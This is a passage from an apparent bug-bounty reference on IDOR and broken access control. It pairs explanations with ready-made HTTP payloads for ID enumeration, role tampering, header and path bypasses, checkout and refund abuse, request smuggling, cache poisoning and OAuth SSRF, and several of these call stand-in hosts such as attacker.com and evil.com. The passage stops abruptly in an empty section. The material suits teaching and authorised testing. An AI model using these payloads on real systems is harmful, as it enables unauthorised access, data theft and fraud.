# IDOR & Broken Access Control - Research-Grade Knowledgebase

> **Version:** 2026-05-24 | **Classification:** Bug Bounty / Pentesting Skill Resource  
> **Sources:** PortSwigger Research, OWASP, HackTricks, PayloadsAllTheThings, Nuclei Templates, ProjectDiscovery, James Kettle Research, SecLists, and Community Research.

---

## Table of Contents

1. [Basics](#basics)
2. [Broken Access Control Theory](#broken-access-control-theory)
3. [Authorization Model Internals](#authorization-model-internals)
4. [IDOR Payloads](#idor-payloads)
5. [Horizontal Privilege Escalation](#horizontal-privilege-escalation)
6. [Vertical Privilege Escalation](#vertical-privilege-escalation)
7. [Multi-Step Workflow Bypasses](#multi-step-workflow-bypasses)
8. [Business Logic Abuse Techniques](#business-logic-abuse-techniques)
9. [Hidden Endpoint Discovery](#hidden-endpoint-discovery)
10. [Parameter Pollution + IDOR Chains](#parameter-pollution--idor-chains)
11. [Mass Assignment + IDOR Chains](#mass-assignment--idor-chains)
12. [Race Condition + IDOR Chains](#race-condition--idor-chains)
13. [Request Smuggling + IDOR Chains](#request-smuggling--idor-chains)
14. [Cache Poisoning + IDOR Chains](#cache-poisoning--idor-chains)
15. [OAuth + IDOR Chains](#oauth--idor-chains)
16. [Authorization Bypass Payloads](#authorization-bypass-payloads)
17. [Parser Confusion Payloads](#parser-confusion-payloads)
18. [Browser Quirks](#browser-quirks)
19. [Gadget Chains](#gadget-chains)
20. [Real World Case Studies](#real-world-case-studies)
21. [Fuzzing Payloads](#fuzzing-payloads)
22. [Automation Workflows](#automation-workflows)
23. [Recon Methodology](#recon-methodology)
24. [Nuclei Templates](#nuclei-templates)
25. [Tools and Scanners](#tools-and-scanners)
26. [Advanced Research](#advanced-research)
27. [Bug Bounty Writeups](#bug-bounty-writeups)
28. [Payload Collections](#payload-collections)
29. [WAF Bypasses](#waf-bypasses)
30. [Detection Techniques](#detection-techniques)
31. [References](#references)

---

## Basics

### What is Access Control?

Access control is the application of constraints on who or what is authorized to perform actions or access resources. In web applications, access control depends on three pillars:

- **Authentication** — Confirms the user is who they claim to be.
- **Session Management** — Identifies which subsequent HTTP requests are made by the same user.
- **Access Control** — Determines whether the user is allowed to carry out the action they are attempting.

### Access Control Types

| Type | Description | Example |
|------|-------------|---------|
| **Vertical** | Restrict access to sensitive functionality to specific user types | Admin vs. regular user |
| **Horizontal** | Restrict access to resources to specific users | User A cannot see User B's bank transactions |
| **Context-dependent** | Restrict based on application state or interaction order | Cannot modify cart after payment |

### Insecure Direct Object References (IDOR)

IDOR is a subcategory of access control vulnerabilities where user-supplied input is used to access objects directly, and an attacker can modify that input to obtain unauthorized access.

```http
# Normal request
GET /customer_account?customer_number=132355 HTTP/1.1
Host: insecure-website.com

# IDOR exploitation
GET /customer_account?customer_number=132356 HTTP/1.1
Host: insecure-website.com
```

### Key Insight

> "Broken access controls are common and often present a critical security vulnerability. Design and management of access controls is a complex and dynamic problem that applies business, organizational, and legal constraints to a technical implementation." — PortSwigger

---

## Broken Access Control Theory

### Vertical Privilege Escalation

If a user can gain access to functionality they are not permitted to access, this is vertical privilege escalation.

#### Unprotected Functionality

Administrative functions might be linked from an admin welcome page but not from a user's welcome page. However, a user might access them by browsing to the relevant admin URL.

```http
GET /admin HTTP/1.1
Host: insecure-website.com
```

**Discovery vectors:**
- Check `robots.txt` for `Disallow` lines revealing admin paths
- Brute-force admin panel locations with wordlists
- Review JavaScript that constructs UI based on user role (the admin URL may be visible in client-side code)

```javascript
// Leaked admin URL in JavaScript
var isAdmin = false;
if (isAdmin) {
    var adminPanelTag = document.createElement('a');
    adminPanelTag.setAttribute('href', 'https://insecure-website.com/administrator-panel-yb556');
    adminPanelTag.innerText = 'Admin panel';
}
```

#### Parameter-Based Access Control

Some applications store access rights in user-controllable locations:

```http
GET /login/home.jsp?admin=true HTTP/1.1
Host: insecure-website.com

GET /login/home.jsp?role=1 HTTP/1.1
Host: insecure-website.com
```

**Cookie-based:**
```http
GET /admin HTTP/1.1
Host: insecure-website.com
Cookie: Admin=false
```
→ Change to `Admin=true`

#### Platform Misconfiguration Bypass

Some applications enforce access controls at the platform layer:

```
DENY: POST, /admin/deleteUser, managers
```

**Bypass via header override:**
```http
POST / HTTP/1.1
Host: insecure-website.com
X-Original-URL: /admin/deleteUser
```

**Bypass via method override:**
```http
GET /admin/deleteUser HTTP/1.1
Host: insecure-website.com
```
→ If POST is blocked but GET is not

#### URL-Matching Discrepancies

| Technique | Example | Notes |
|-----------|---------|-------|
| Case variation | `/ADMIN/DELETEUSER` vs `/admin/deleteUser` | Some systems treat these differently |
| Suffix pattern match (Spring < 5.3) | `/admin/deleteUser.anything` | `useSuffixPatternMatch` enabled by default |
| Trailing slash | `/admin/deleteUser/` vs `/admin/deleteUser` | May be treated as distinct endpoints |
| Double slash | `//admin/deleteUser` | Path normalization differences |

### Horizontal Privilege Escalation

A user gains access to resources belonging to another user.

```http
GET /myaccount?id=123 HTTP/1.1
Host: insecure-website.com

# Modified to access another user's account
GET /myaccount?id=456 HTTP/1.1
Host: insecure-website.com
```

**GUID-based targets:** If the application uses GUIDs, they might be disclosed elsewhere (user messages, reviews, API responses).

**Redirect leakage:** Even if the application detects unauthorized access and redirects to the login page, the redirect response might still contain sensitive data.

### Horizontal to Vertical Escalation

A horizontal escalation can be turned into vertical escalation by compromising a more privileged user:

```http
GET /myaccount?id=456 HTTP/1.1
Host: insecure-website.com
```

If user `456` is an administrator, the attacker gains access to an administrative account page, potentially disclosing the admin password or providing means to change it.

### Context-Dependent Access Control

Restricts access based on application state or user interaction order.

**Example:** A retail website prevents users from modifying cart contents after payment. If the payment step is bypassed, the cart modification might still work.

### Referer-Based Access Control

Some websites base access controls on the `Referer` header:

```http
GET /admin/deleteUser HTTP/1.1
Host: insecure-website.com
Referer: https://insecure-website.com/admin
```

The `Referer` header is fully attacker-controllable, allowing forged direct requests to sensitive sub-pages.

### Location-Based Access Control

Access controls based on geographical location can often be circumvented using:
- Web proxies
- VPNs
- Manipulation of client-side geolocation mechanisms

---

## Authorization Model Internals

### OWASP API1:2023 — Broken Object Level Authorization (BOLA)

> "Every API endpoint that receives an ID of an object, and performs any action on the object, should implement object-level authorization checks."

**Key distinction:**
- **BOLA (IDOR):** User has access to the endpoint/function but manipulates the object ID to access unauthorized data
- **BFLA:** User accesses an API endpoint/function they should not have access to at all

**Insufficient fix:** Comparing the user ID from the JWT token with the vulnerable ID parameter only addresses a small subset of cases.

### Authorization Check Placement

```
[Client] → [Authentication] → [Authorization Check] → [Business Logic] → [Database]
                                     ↑
                              MUST be here, not later
```

**Anti-pattern:** Checking authorization only at the UI layer or after data retrieval.

### Common Authorization Patterns

| Pattern | Vulnerability |
|---------|--------------|
| Role stored in cookie | Client-side tampering |
| Role stored in hidden field | Client-side tampering |
| Role stored in JWT without signature verification | Token manipulation |
| Authorization check in middleware only | Bypass via direct API calls |
| Authorization check on GET but not PUT/DELETE/PATCH | Method-based bypass |

---

## IDOR Payloads

### Numeric Value Parameters

```http
# Increment/decrement
GET /api/users/287789 HTTP/1.1
GET /api/users/287790 HTTP/1.1
GET /api/users/287791 HTTP/1.1

# Hexadecimal
GET /api/users/0x4642d HTTP/1.1
GET /api/users/0x4642e HTTP/1.1

# Unix epoch timestamp
GET /api/users/1695574808 HTTP/1.1
```

### Common Identifiers

```http
# Name-based
GET /api/users/john HTTP/1.1
GET /api/users/john.doe HTTP/1.1

# Email-based
GET /api/users/john.doe@mail.com HTTP/1.1

# Base64 encoded
GET /api/users/am9obi5kb2VAbWFpbC5jb20= HTTP/1.1
```

### Weak Pseudo-Random Generators

```http
# UUID/GUID v1 (predictable if creation time known)
GET /api/users/95f6e264-bb00-11ec-8833-00155d01ef00 HTTP/1.1

# MongoDB Object IDs (predictable structure)
GET /api/users/5ae9b90a2c144b9def01ec37 HTTP/1.1
# Structure: 4-byte timestamp + 3-byte machine ID + 2-byte process ID + 3-byte counter
```

### Hashed Parameters

```http
# MD5
GET /api/users/098f6bcd4621d373cade4e832627b4f6 HTTP/1.1

# SHA1
GET /api/users/a94a8fe5ccb19ba61c4c0873d391e987982fbbd3 HTTP/1.1

# SHA256
GET /api/users/9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08 HTTP/1.1
```

### Wildcard Parameters

```http
GET /api/users/* HTTP/1.1
GET /api/users/% HTTP/1.1
GET /api/users/_ HTTP/1.1
GET /api/users/. HTTP/1.1
```

### IDOR Tips & Tricks

```http
# Change HTTP method
POST /api/users/123 → PUT /api/users/123

# Change content type
Content-Type: application/xml → Content-Type: application/json

# Transform numerical values to arrays
{"id":19} → {"id":[19]}

# Parameter Pollution
GET /api/users?user_id=hacker_id&user_id=victim_id HTTP/1.1

# Path traversal in ID parameter
GET /api/users/../admin HTTP/1.1

# Case variation
GET /api/USERS/123 HTTP/1.1

# Encoding variations
GET /api/users/%31%32%33 HTTP/1.1  # URL-encoded "123"
GET /api/users/123%00 HTTP/1.1     # Null byte injection

# Array index manipulation
GET /api/users[0] HTTP/1.1
GET /api/users[-1] HTTP/1.1

# JSON parameter pollution
POST /api/users HTTP/1.1
Content-Type: application/json
{"id": 123, "id": 456}
```

### Static File IDOR

```http
# Incrementing filenames
GET /static/12144.txt HTTP/1.1
GET /static/12145.txt HTTP/1.1

# Predictable patterns
GET /uploads/user_123/document.pdf HTTP/1.1
GET /uploads/user_124/document.pdf HTTP/1.1

# Backup files
GET /static/12144.txt.bak HTTP/1.1
GET /static/12144.txt~ HTTP/1.1
GET /static/.12144.txt.swp HTTP/1.1
```

---

## Horizontal Privilege Escalation

### Direct Object Reference Manipulation

```http
# Original
GET /api/v1/orders/1000 HTTP/1.1
Authorization: Bearer user_a_token

# Escalation
GET /api/v1/orders/1001 HTTP/1.1
Authorization: Bearer user_a_token

# Batch enumeration
GET /api/v1/orders/1000,1001,1002 HTTP/1.1
GET /api/v1/orders?ids[]=1000&ids[]=1001 HTTP/1.1
```

### Cross-User Data Access

```http
# Account information
GET /api/v1/users/123/profile HTTP/1.1
→ GET /api/v1/users/124/profile HTTP/1.1

# Messages/communications
GET /api/v1/messages/12345 HTTP/1.1
→ GET /api/v1/messages/12346 HTTP/1.1

# Documents/files
GET /api/v1/documents/abc123 HTTP/1.1
→ GET /api/v1/documents/abc124 HTTP/1.1

# Payment/transaction history
GET /api/v1/transactions/txn_123 HTTP/1.1
→ GET /api/v1/transactions/txn_124 HTTP/1.1
```

### GUID Disclosure Vectors

1. **Public profiles** — User references in reviews, comments, forums
2. **API responses** — Leaked in error messages or verbose responses
3. **Email notifications** — IDs embedded in notification links
4. **Social features** — Friend lists, follower data
5. **Search functionality** — Search results may expose IDs
6. **Public feeds** — Activity streams, public posts

---

## Vertical Privilege Escalation

### Unprotected Admin Panels

```http
# Direct access
GET /admin HTTP/1.1
GET /administrator HTTP/1.1
GET /admin-panel HTTP/1.1
GET /manage HTTP/1.1
GET /dashboard/admin HTTP/1.1
GET /wp-admin HTTP/1.1
GET /administrator-panel HTTP/1.1
GET /controlpanel HTTP/1.1
GET /cpanel HTTP/1.1
GET /moderator HTTP/1.1
GET /backend HTTP/1.1
GET /console HTTP/1.1
```

### Role Parameter Manipulation

```http
# Cookie-based
Cookie: role=user → Cookie: role=admin
Cookie: isAdmin=false → Cookie: isAdmin=true
Cookie: admin=0 → Cookie: admin=1
Cookie: access_level=1 → Cookie: access_level=9

# Query parameter
GET /dashboard?role=admin HTTP/1.1
GET /dashboard?admin=true HTTP/1.1
GET /dashboard?is_admin=1 HTTP/1.1

# Header-based
X-Role: admin
X-User-Role: administrator
X-Admin: true
X-Is-Admin: 1

# Body parameter (JSON)
POST /api/login HTTP/1.1
Content-Type: application/json
{"username":"user","password":"pass","role":"admin"}

# Body parameter (form)
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
username=user&password=pass&role=admin
```

### JWT Token Manipulation

```json
// Original token payload
{
  "sub": "1234567890",
  "name": "John Doe",
  "role": "user",
  "iat": 1516239022
}

// Modified payload
{
  "sub": "1234567890",
  "name": "John Doe",
  "role": "admin",
  "iat": 1516239022
}
```

**Common JWT vulnerabilities:**
- Algorithm confusion (`alg: none`)
- Weak secret/key
- Missing signature verification
- Kid header injection

### Platform-Level Bypass

```http
# X-Original-URL bypass
POST / HTTP/1.1
Host: target.com
X-Original-URL: /admin/deleteUser

# X-Rewrite-URL bypass
POST / HTTP/1.1
Host: target.com
X-Rewrite-URL: /admin/deleteUser

# X-HTTP-Method-Override
POST /admin/deleteUser HTTP/1.1
Host: target.com
X-HTTP-Method-Override: GET

# Method override via query parameter
GET /admin/deleteUser?_method=POST HTTP/1.1
```

---

## Multi-Step Workflow Bypasses

### Missing Step Validation

Many applications implement important functions over multiple steps:

1. Load form with details for a specific user
2. Submit changes
3. Review and confirm

**Vulnerability:** Steps 1 and 2 have access controls, but step 3 does not.

```http
# Skip to confirmation step directly
POST /admin/confirm-role-change HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=victim&role=admin&confirm=true
```

### Workflow State Manipulation

```http
# Manipulate state parameter
POST /checkout/process HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "step": 3,
  "order_id": "12345",
  "payment_confirmed": true,
  "shipping_address": "attacker_address"
}

# Skip payment step
POST /checkout/complete HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "order_id": "12345",
  "skip_payment": true
}
```

### Race Condition in Multi-Step Processes

```http
# Step 1: Add item to cart
POST /cart/add HTTP/1.1

# Step 2: Apply discount (race condition — apply multiple times)
POST /cart/apply-discount HTTP/1.1
# Send 20 parallel requests with the same discount code
```

---

## Business Logic Abuse Techniques

### Review Feature Testing

```http
# Post review without purchase
POST /api/reviews HTTP/1.1
Content-Type: application/json
{"product_id": "123", "rating": 5, "verified_purchase": true}

# Rating outside valid range
POST /api/reviews HTTP/1.1
Content-Type: application/json
{"product_id": "123", "rating": 999}

# Negative rating
POST /api/reviews HTTP/1.1
Content-Type: application/json
{"product_id": "123", "rating": -5}

# Multiple reviews via race condition
# Send 10 parallel POST /api/reviews requests
```

### Discount Code Abuse

```http
# Reuse single-use code
POST /cart/apply-discount HTTP/1.1
Content-Type: application/json
{"code": "SINGLE-USE-CODE"}
# Send parallel requests to race the validation

# Apply multiple codes
POST /cart/apply-discount HTTP/1.1
Content-Type: application/json
{"code": ["CODE1", "CODE2", "CODE3"]}

# Parameter pollution
POST /cart/apply-discount?code=CODE1&code=CODE2&code=CODE3 HTTP/1.1
```

### Delivery Fee Manipulation

```http
POST /checkout/update-shipping HTTP/1.1
Content-Type: application/json
{"delivery_fee": -50.00, "order_total": 100.00}

# Negative delivery fee reduces total
POST /checkout/update-shipping HTTP/1.1
Content-Type: application/json
{"delivery_fee": -999.99}
```

### Currency Arbitrage

```http
# Pay in USD
POST /checkout/pay HTTP/1.1
Content-Type: application/json
{"amount": 100, "currency": "USD"}

# Request refund in EUR (different conversion rate)
POST /refund HTTP/1.1
Content-Type: application/json
{"transaction_id": "txn_123", "currency": "EUR"}
```

### Premium Feature Exploitation

```http
# Access premium endpoint with free account
GET /api/premium/features HTTP/1.1
Cookie: subscription=free
→ Modify to: Cookie: subscription=premium

# True/false flip
GET /api/premium/features HTTP/1.1
X-Subscription-Active: false
→ X-Subscription-Active: true

# LocalStorage tampering (client-side)
localStorage.setItem("isPremium", "true")
```

### Refund Abuse

```http
# Purchase then refund, keep access
POST /refund HTTP/1.1
Content-Type: application/json
{"order_id": "12345", "reason": "changed_mind"}
# Verify if product remains accessible after refund

# Multiple refund requests
# Send parallel POST /refund requests for same order
```

### Cart/Wishlist Exploitation

```http
# Negative quantity
POST /cart/update HTTP/1.1
Content-Type: application/json
{"items": [{"id": "A", "qty": -5}, {"id": "B", "qty": 5}]}

# Exceed available stock
POST /cart/update HTTP/1.1
Content-Type: application/json
{"items": [{"id": "A", "qty": 999999}]}

# Move items between users
POST /wishlist/move HTTP/1.1
Content-Type: application/json
{"item_id": "123", "target_user_id": "456"}
```

### Rounding Error Exploitation

```http
# Cryptocurrency rounding error
POST /transfer HTTP/1.1
Content-Type: application/json
{"amount": "0.000000005", "currency": "XBT", "to": "attacker"}
# 0.5 satoshi — below minimum precision (1 satoshi)
# Sender rounded down to 0, receiver rounded up to 1 satoshi
```

---

## Hidden Endpoint Discovery

### robots.txt Analysis

```
User-agent: *
Disallow: /admin/
Disallow: /api/
Disallow: /internal/
Disallow: /backup/
```

### JavaScript Analysis

```javascript
// Look for API endpoints in JS files
fetch('/api/v2/users/' + userId)
fetch('/internal/api/stats')
fetch('/admin/panel/data')

// Look for hidden routes in React/Vue/Angular router configs
{ path: '/admin', component: AdminPanel }
{ path: '/superuser', component: SuperUserPanel }
```

### Common Admin/Internal Paths

```
/admin
/administrator
/admin-panel
/administration
/manage
/management
/dashboard
/console
/backend
/cpanel
/controlpanel
/moderator
/superuser
/root
/system
/internal
/api/internal
/api/private
/api/v1/admin
/api/v2/admin
/dev
/development
/staging
/test
/beta
/backup
/old
/v1
/v2
/api/docs
/swagger
/swagger-ui
/api/swagger
/graphql
/api/graphql
/playground
/graphiql
/.env
/.git
/.svn
/.htaccess
/config
/configuration
/settings
/setup
/install
/debug
/phpmyadmin
/wp-admin
/wp-login
/adminer
/elmah.axd
/trace.axd
```

### Wordlist Sources

- SecLists `Discovery/Web-Content/` — comprehensive web discovery wordlists
- `raft-*` wordlists — directory and file brute-forcing
- `combined_directories.txt` — auto-updated combined wordlist
- `reverse-proxy-inconsistencies.txt` — backend admin interfaces behind proxies

### Parameter Discovery

```http
# Use Param Miner to guess hidden parameters
# Right-click request → "Guess headers" / "Guess cookies" / "Guess params"

# Common hidden parameters
X-Original-URL
X-Rewrite-URL
X-Forwarded-Host
X-Forwarded-For
X-Real-IP
X-Remote-IP
X-Remote-Addr
X-ProxyUser-Ip
X-HTTP-Host-Override
X-Forwarded-Server
X-HTTP-Method-Override
X-HTTP-Method
X-Method-Override
_method
```

---

## Parameter Pollution + IDOR Chains

### HTTP Parameter Pollution (HPP)

```http
# Duplicate parameters — backend may process different values
GET /api/users?id=123&id=456 HTTP/1.1

# Different parsing behaviors:
# PHP/Apache: last value wins (456)
# ASP.NET/IIS: comma-separated ("123,456")
# JSP/Tomcat: first value wins (123)
# Python/Flask: list of values (["123", "456"])
# Node.js/Express: first value wins (123)
```

### HPP + IDOR Chain

```http
# If backend takes first value, WAF takes last
GET /api/users?id=123&id=123 HTTP/1.1
# WAF sees 123 (authorized), backend sees 123 (authorized)

# Attack:
GET /api/users?id=123&id=456 HTTP/1.1
# WAF sees 456 (blocked?)
# Backend sees 123 (authorized) — bypass!
```

### JSON Parameter Pollution

```http
POST /api/users HTTP/1.1
Content-Type: application/json

{"id": 123, "id": 456}
# Some parsers use last value, some use first
```

### Array-based IDOR

```http
POST /api/users/delete HTTP/1.1
Content-Type: application/json

{"ids": [123, 456, 789]}
# If authorization only checks first element, remaining are unauthorized deletions
```

---

## Mass Assignment + IDOR Chains

### Mass Assignment Vulnerabilities

```http
# User registration — extra fields accepted
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "password": "password123",
  "role": "admin",           // Mass assignment
  "is_admin": true,         // Mass assignment
  "credit_balance": 1000000   // Mass assignment
}
```

### Mass Assignment + IDOR

```http
# Update profile — inject admin fields
PUT /api/users/123 HTTP/1.1
Content-Type: application/json

{
  "email": "new@email.com",
  "role": "admin",
  "permissions": ["*"]
}

# If the endpoint updates all provided fields without authorization checks
# on specific fields, role escalation occurs
```

### OAuth Mass Assignment (CVE-2021-27582)

```http
# MITREid Connect — mass assignment on confirmation page
/oauth/confirm_access?client_id=...&response_type=code&redirectUri=http://malicious.example.com
# redirectUri (note camelCase) binds to AuthorizationRequest.redirectUri via @ModelAttribute
# Bypasses redirect_uri validation on /authorize endpoint
```

---

## Race Condition + IDOR Chains

### Race Condition Fundamentals

Race conditions occur when the application's behavior depends on the sequence or timing of uncontrollable events.

```http
# Classic race condition: apply discount multiple times
# Send 50 parallel requests:
POST /cart/apply-discount HTTP/1.1
Content-Type: application/json
{"code": "ONE-TIME-CODE"}
```

### Race Condition + IDOR

```http
# Transfer money — race the balance check
# Send parallel requests:
POST /api/transfer HTTP/1.1
Content-Type: application/json
{"from": "123", "to": "456", "amount": 100}

# If balance check and deduction are not atomic,
# multiple transfers may succeed with insufficient funds
```

### OAuth Session Poisoning (Race Condition)

```http
# Step 1: Visit authorization with trusted client
GET /authorize?client_id=trusted&redirect_uri=http://trusted.com HTTP/1.1

# Step 2 (background): Poison session with malicious client
GET /authorize?client_id=malicious&redirect_uri=http://evil.com HTTP/1.1

# Step 3: Approve trusted client → redirected to evil.com with token
```

### Single-Packet Attack (Turbo Intruder)

```python
# Turbo Intruder script for race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)

    for i in range(50):
        engine.queue(target.req, target.baseInput)

def handleResponse(req, interesting):
    table.add(req)
```

---

## Request Smuggling + IDOR Chains

### HTTP Request Smuggling Basics

Request smuggling occurs when front-end and back-end servers disagree about where one request ends and the next begins.

```
TE.CL and CL.TE    // classic request smuggling
H2.CL and H2.TE    // HTTP/2 downgrade smuggling
CL.0               // backend ignores Content-Length
H2.0               // implied by CL.0
0.CL and 0.TE      // unexploitable without pipelining
```

### CL.TE Desync

```http
POST /about HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

12
GPOST / HTTP/1.1

0

```

### TE.CL Desync

```http
POST /about HTTP/1.1
Host: example.com
Content-Length: 6
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1

```

### Request Smuggling + IDOR Exploitation

```http
# Smuggle an IDOR request past the front-end
POST / HTTP/1.1
Host: target.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET /api/admin/users/123 HTTP/1.1
X-Ignore: x
```

### Header Injection via Smuggling

```http
# Inject headers into victim's request
POST / HTTP/1.1
Host: target.com
Content-Length: 120
Transfer-Encoding: chunked

0

GET /api/users/456 HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Admin: true
X-Ignore: x
```

### Smuggling + Internal API Access

```http
POST / HTTP/1.1
Host: login.target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /internal_api/934454/session HTTP/1.1
Host: alerts.target.com
X-Forwarded-Proto: https
Service-Gateway-Account-Id: 934454
Service-Gateway-Is-Newrelic-Admin: true

```

### Client-Side Desync (CSD)

```javascript
// Browser-powered desync attack
fetch('https://target.com/assets', {
    method: 'POST',
    body: "GET /robots.txt HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://target.com/'
})
```

---

## Cache Poisoning + IDOR Chains

### Web Cache Poisoning Basics

Cache poisoning exploits the gap between what the cache uses as a key and what the application uses to generate the response.

```http
# Cache key components (typically):
# - Method
# - Path
# - Query string
# - Host header

# Unkeyed components (can be poisoned):
# - Most headers
# - Cookies
# - Body content
```

### Cache Key Transformation Attacks

```http
# Port removal from cache key
GET / HTTP/1.1
Host: target.com:1337

# Response cached with redirect to :1337
# Subsequent requests to target.com get redirected to dead port
```

### Parameter Cloaking

```http
# Akamai akamai-transform parameter excluded from key
GET /en?x=1?akamai-transform=payload-goes-here HTTP/1.1
Host: target.com
# Cache key: /en?x=1
# Application sees: x=1 AND akamai-transform=payload
```

### Fat GET Requests

```http
GET /contact/report-abuse?report=victim HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=attacker
```

### Cache Poisoning + IDOR

```http
# Poison cache for IDOR endpoint
GET /api/users/123 HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response cached for /api/users/123
# All subsequent requests return attacker-controlled data
```

### Cache Key Injection

```http
# Akamai cache key injection
GET /?x=2 HTTP/1.1
Origin: '-alert(1)-'__

# Cache key contains unescaped delimiter
# Second request with same key gets poisoned response
```

---

## OAuth + IDOR Chains

### Hidden OAuth Attack Vectors

#### Dynamic Client Registration SSRF

```http
POST /connect/register HTTP/1.1
Host: server.example.com
Content-Type: application/json

{
  "redirect_uris": ["https://client.example.org/callback"],
  "logo_uri": "http://attacker.com/xss.html",
  "jwks_uri": "http://attacker.com/keys.jwks",
  "sector_identifier_uri": "http://attacker.com/uris.json",
  "request_uris": ["http://attacker.com/request.jwt"]
}
```

**SSRF trigger parameters:**
- `logo_uri` — fetched when displaying approval page
- `jwks_uri` — fetched when validating client_assertion
- `sector_identifier_uri` — fetched during authorization flow
- `request_uris` — fetched at start of authorization

#### Redirect URI Session Poisoning

```http
# Step 1: Authorize with trusted client
/authorize?client_id=trusted&redirect_uri=http://trusted.com&prompt=consent

# Step 2 (background): Poison session
/authorize?client_id=malicious&redirect_uri=http://evil.com

# Step 3: Approve → redirected to evil.com with code/token
```

#### WebFinger User Enumeration

```http
GET /.well-known/webfinger?resource=http://x/anonymous&rel=http://openid.net/specs/connect/1.0/issuer HTTP/1.1
Host: target.com

# Enumerate valid usernames by changing "anonymous"
```

### OAuth + IDOR

```http
# OAuth token endpoint with IDOR
POST /oauth/token HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=CODE&client_id=CLIENT&client_secret=SECRET

# If client_id is not validated against code ownership,
# attacker can exchange victim's code with their own credentials
```

---

## Authorization Bypass Payloads

### Header-Based Bypasses

```http
# IP-based authorization bypass
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1

# Host header bypass
Host: localhost
Host: 127.0.0.1
Host: admin.target.com

# Origin/Referer manipulation
Origin: https://admin.target.com
Referer: https://admin.target.com/
```

### Method-Based Bypasses

```http
# ACL only on POST, not GET
POST /admin/deleteUser → 403 Forbidden
GET /admin/deleteUser → 200 OK

# Method override
POST /admin/deleteUser HTTP/1.1
X-HTTP-Method-Override: GET

# Non-standard methods
POSTX /admin/deleteUser
GETX /admin/deleteUser
CUSTOM /admin/deleteUser
```

### Path-Based Bypasses

```http
# Case variation
GET /ADMIN/DELETEUSER HTTP/1.1

# Encoding
GET /%61dmin/%64elete%55ser HTTP/1.1

# Path traversal
GET /admin/../admin/deleteUser HTTP/1.1
GET /./admin/deleteUser HTTP/1.1
GET /admin/deleteUser/. HTTP/1.1
GET /admin/deleteUser/../deleteUser HTTP/1.1

# Double encoding
GET /%2561dmin/deleteUser HTTP/1.1

# Unicode normalization
GET /admin%C0%AFdeleteUser HTTP/1.1

# Null byte (legacy systems)
GET /admin%00/deleteUser HTTP/1.1

# Semicolon path parameters (Java/JSP)
GET /admin/deleteUser;param=value HTTP/1.1
```

### Content-Type Bypasses

```http
# Change content type to bypass validation
Content-Type: application/xml → application/json
Content-Type: application/x-www-form-urlencoded → application/json

# Boundary manipulation (multipart)
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
→ Modify boundary to inject extra fields
```

---

## Parser Confusion Payloads

### HTTP/1.1 Parser Discrepancies

```http
# Header name with leading space
 Host: attacker.com

# Header name with tab
Transfer-Encoding:\tchunked

# Header value with multiple spaces
Transfer-Encoding:  chunked

# Line folding
Transfer-Encoding:\n chunked

# Multiple Transfer-Encoding headers
Transfer-Encoding: chunked
Transfer-Encoding: x

# Case variation
Transfer-encoding: chunked
transfer-encoding: chunked
TRANSFER-ENCODING: chunked

# Charset in Content-Type
Content-Type: application/x-www-form-urlencoded; charset=null, boundary=x
```

### HTTP/2 Downgrade Smuggling

```http
# HTTP/2 request with no Content-Length
:method POST
:path /
:authority target.com

# ALB adds Transfer-Encoding: chunked without altering body
# → Perfect smuggling vector
```

### CL.0 Desync (Backend Ignores Content-Length)

```http
POST /static/file.txt HTTP/1.1
Host: target.com
Content-Length: 23

GET /404 HTTP/1.1
X: Y
```

### 0.CL Desync (Frontend Hides Content-Length)

```http
GET /con HTTP/1.1
Host: target.com
Content-Length: 
7

# IIS responds early on reserved names (CON, PRN, AUX, NUL, COM1-9)
# Leaves connection open for body to be interpreted as new request
```

### Expect-Based Desync

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 7
Expect: 100-continue

GET /x
```

---

## Browser Quirks

### Connection Pool Behavior

```javascript
// Chrome has two connection pools:
// - With cookies
// - Without cookies

// Always poison the 'with-cookies' pool
fetch('https://target.com/', {
    credentials: 'include'  // Use with-cookies pool
})
```

### CORS Error Handling

```javascript
// Use CORS error to prevent redirect following
fetch('https://target.com/assets', {
    method: 'POST',
    body: "GET /x?<script>alert(1)</script> HTTP/1.1\r\nX: Y",
    credentials: 'include',
    mode: 'cors'  // Triggers CORS error, prevents redirect follow
}).catch(() => {
    location = 'https://target.com/'
})
```

### Stacked Response Problem

Browsers discard connections if they receive more response data than expected. Solutions:
- Use cache-busters to delay responses (cache miss = slower)
- Use HEAD method to control response size
- Pad injected requests with lengthy headers

### Safari HSTS Auto-Upgrade

Safari auto-upgrades HTTP to HTTPS if the target is in the HSTS cache. This can bypass mixed-content protections.

### Edge Mixed-Content Bypass

Edge allows 302 redirects to HTTPS URLs even from HTTPS pages, bypassing mixed-content protection.

### Internet Explorer Mixed-Content Bypass

IE's mixed-content protection can be completely bypassed under certain conditions.

---

## Gadget Chains

### Host-Header Redirect Gadget

```http
# Apache/IIS default behavior: redirect to folder with trailing slash
# uses Host header value
GET /etc HTTP/1.1
Host: attacker.com

# Response:
HTTP/1.1 301 Moved Permanently
Location: http://attacker.com/etc/
```

### HEAD Method Gadget

```http
